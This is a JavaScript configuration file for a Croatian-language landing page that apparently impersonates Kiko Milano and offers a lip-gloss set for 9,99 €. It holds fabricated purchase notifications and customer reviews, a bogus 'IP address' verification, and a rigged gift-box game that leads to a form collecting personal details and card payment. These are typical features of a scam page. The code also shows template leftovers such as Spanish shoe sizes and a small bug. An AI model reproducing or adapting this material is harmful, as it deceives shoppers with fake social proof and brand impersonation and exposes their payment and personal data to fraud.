const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;

(function (exp) {
  const countryCode = "hr";
  const lang = "hr-HR";
  const locale = lang;

  const sizes = {
    enabled: false,
    selectText: "Talla: ",
    arr: [
      "EU 36",
      "EU 37",
      "EU 37.5",
      "EU 38",
      "EU 38.5",
      "EU 39",
      "EU 39.5",
      "EU 40",
      "EU 40.5",
      "EU 41",
      "EU 41.5",
      "EU 42",
      "EU 42.5",
      "EU 43",
      "EU 43.5",
      "EU 44",
      "EU 44.5",
      "EU 45",
      "EU 45.5",
      "EU 46",
      "EU 46.5",
      "EU 47",
      "EU 47.5",
      "EU 48",
      "EU 49",
      "EU 50",
      "EU 51",
      "EU 52",
    ],
  };

  const mainProduct = {
    header: "Novo | Uštedite 29,00 €",
    name: "Kiko Milano Hydra 3D set za usne",
    oldPrice: "29,00 €",
    newPrice: "9,99 €",
    selectText: "",
    text: `
    
    
    <b>Umirujuće sjajilo za usne - Kiko Milano 3D Hydra Lipgloss</b>
    <br><br>
    
    <b>Karakteristike:</b>
    <br>

    - Glatka, neljepljiva konzistencija;<br>
- Aplikator od mekanog filca omogućuje jednostavno, ravnomjerno nanošenje<br>
- Ne klizi u pukotine i omogućuje crtanje čistih obrisa<br>
- Bogata paleta sadrži mnogo izvrsnih nijansi;<br>
- Vrlo izdržljiva;<br>
- Slojevi s različitim efektima: transparentni, sjajni, sedefasti, visoko pigmentirani ;<br>
- Sadrži fragment nasljeđa<br>
- Elegantno kompaktno pakiranje s logotipom tvrtke<br>
- Dermatološki testiran.<br>
<br><br>
<b>Kako biste iskoristili personalizirani popust, odgovorite na nekoliko pitanja:</b>
`,
  };

  const notifications = [
    {
      user: "Mia S*****",
      location: "Zagreb, Croatia",
      action: "Upravo sam dobio dobar proizvod za 9,99 €!",
      timeago: "prije 15 sekundi",
    },
    {
      user: "Ema  B******",
      location: "Split, Croatia",
      action: "Upravo sam dobio dobar proizvod za 9,99 €!",
      timeago: "prije 25 sekundi",
    },
  ];

  const reviewsArr = [
    {
      name: "Lucija",
      time: "prije 1 dan",
      header: "Stil!",
      image: "./assets/r_5.jpg",
      review:
        "Zaljubljena sam u ova sjajila. Dostupan u najpopularnijim nijansama. Jako su lijepe konzistencije i jako se sjaje na usnama. Jako sam zadovoljan.",
    },
    {
      name: "Sara",
      time: "Prije 2 dana",
      header: "Kiko super kao i uvijek",
      image: "./assets/r_3.jpg",
      review:
        "Ovo je jako cool set, Kiko sjajila imaju najbolju teksturu, dobar sjaj",
    },
    {
      name: "Nika",
      time: "prije 3 dana",
      header: "Lijep poklon",
      image: "./assets/r_4.jpg",
      review:
        "Ovo sam naručila kao poklon svojoj kćeri, već dugo želi Kiko sjajila za usne",
    },
    {
      name: "Marta",
      time: "prije 5 dana",
      header: "Neodoljivo moderan šešir!",
      image: "./assets/r_6.jpeg",
      review: "Prekrasan set najpopularnijih nijansi sjajila za usne.",
    },
    {
      name: "Petra",
      time: "prije 9 dana",
      header: "Ništa manje nisam ni očekivao od Kika.",
      image: "./assets/r_2.jpg",
      review:
        "Ovo nije prvi put da kupujem Kiko Milano kozmetiku, uvijek vrhunske kvalitete",
    },
  ];

  const reviews = {
    reviews: reviewsArr,
    rr: "RECENZIJE I OCJENE",
    percent: "99%",
    rec: "preporučite ovaj proizvod",
  };

  const questions = {
    _of: "Pitanje  {1} od {2}:",
    arr: [
      {
        q: "Jeste li ikada koristili Kiko Milano kozmetiku?",
        a: ["Da", "Ne"],
      },
      {
        q: "Koliko često koristite sjajilo za usne?",
        a: ["Svaki dan", "Samo državni praznici", "Ovisi o situaciji"],
      },
      {
        q: "Od koga naručujete komplet?",
        a: ["Za sebe", "Za prijatelja", "Za člana moje obitelji"],
      },
    ],
  };

  const check = {
    title: "Vaš odgovor će biti provjeren.",
    arr: [
      "Odgovorili ste na pitanje 3/3.",
      "Vaša IP adresa ne dopušta donošenje zaključaka o prethodnim zahtjevima.",
      "Vaš odgovor je provjeren.",
    ],
  };

  const modals = {
    welcome: {
      texts: {
        header: "Čestitamo, potvrdili ste da ste stvarna osoba.",
        button: "OK",
        text: `
        <center>
       Danas, {date},Imate priliku osvojiti set Kiko Milano Hydra 3D usana.
          <br><br>
        Sve što trebate učiniti je odabrati pravu poklon kutiju.
          <br><br>
     Imate 3 pokušaja, sretno!
        </center>
      `,
      },
    },
    first: {
      texts: {
        header: "O ne...",
        button: "OK",
        text: `
        <center>
     Nažalost, ovo darivanje je prazno! Imate još 2 pokušaja, sretno!
        </center>
      `,
      },
    },
    win: {
      texts: {
        header: "Čestitamo! Pobjedio si!",
        button: "OK",
        text: `
        <center>
          <p style="color: #000">
        Osvojili ste "Kiko Milano Hydra 3D set za usne
          </p>
          <br>
            1) Kliknite "OK" za odlazak na stranicu za isporuku.
            <br><br>
            2) Ispunite obrazac i platite kako biste dobili svoj set.
            <br><br>
            3) Paket će biti isporučen u roku od 2 do 3 dana.
        </center>
      `,
      },
    },
  };

  const cartSteps = {
    personal: {
      title: "Osobne informacije",
      fields: {
        name: {
          field: "Ime",
        },
        family: {
          field: "Prezime",
        },
        phone: {
          field: "Broj telefona",
        },
        email: {
          field: "E-Mail",
        },
      },
    },
    delivery: {
      title: "Distribucija",
      fields: {
        city: {
          field: "Grad",
        },
        address: {
          field: "Adresa dostave",
        },
        zip: {
          field: "Poštanski brojevi",
        },
      },
    },
    payment: {
      title: "Uvjeti plaćanja",
      creditCard: "Online plaćanje bankovnom karticom",
    },
  };

  const cart = {
    steps: cartSteps,
    main: {
      title: "Sažetak narudžbe",
      oldPrice: "29,00 €",
      newPrice: "9,99 €",
      size: "Talla",
      subTotal: {
        title: "Vrijednost narudžbe",
        amount: "9,99 €",
      },
      delivery: {
        title: "Distribucija",
        amount: "0,00 €",
      },
      total: {
        title: "Ukupno",
        amount: "9,99 €",
      },
      checkoutButton: "Platite svoju narudžbu",
    },
  };

  const products = [
    {
      id: "26468782",
      name: "",
      miniImg: "./assets/P_1.webp",
      images: [
        "./assets/P_1.webp",
        "./assets/P_2.webp",
        "./assets/P_3.webp",
        "./assets/P_4.webp",
      ],
    },
  ];

  const footer = {
    cr: "© 2023 Kiko Milano. Sva prava pridržana.",
  };

  const pathImgBox = {
    lid: "./assets/box-lid.png",
    lidIOs: "./assets/box-lid-ios.png",
    inner: "./assets/box-inner.png",
    innerGift: "./assets/box-inner-gift.png",
    box: "./assets/box.png",
    boxModal: "./assets/box-modal.png",
  };

  exp.__config = {
    pathImgBox,
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
  };
})(window);

window.addEventListener("load", () => {
  for (let path of Object.values(window.__config.pathImgBox)) {
    let link = document.createElement("link");
    link.setAttribute("as", "image");
    link.setAttribute("href", path);
    link.rel = "preload";
    document.head.appendChild(link);
  }
});

const lsSelectProduct = (val) =>
  localStorage.setItem("__selected_product", val);
const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = localStorage.getItem("__selected_product");

  if (ind == null) {
    ind = products[0].id;
    lsSelectProduct(ind);
  }

  return products.find((pr) => pr.id === ind);
};
const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) => localStorage.setItem("__selected_size", val);
const lsGetSelectedSizeInd = () => {
  const ind = localStorage.getItem("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;

  return sizes.arr?.[lsGetSelectedSizeInd()];
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => localStorage.setItem("__step", val);
const lsGetStep = () => {
  const step = localStorage.getItem("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

const enableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");
};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};
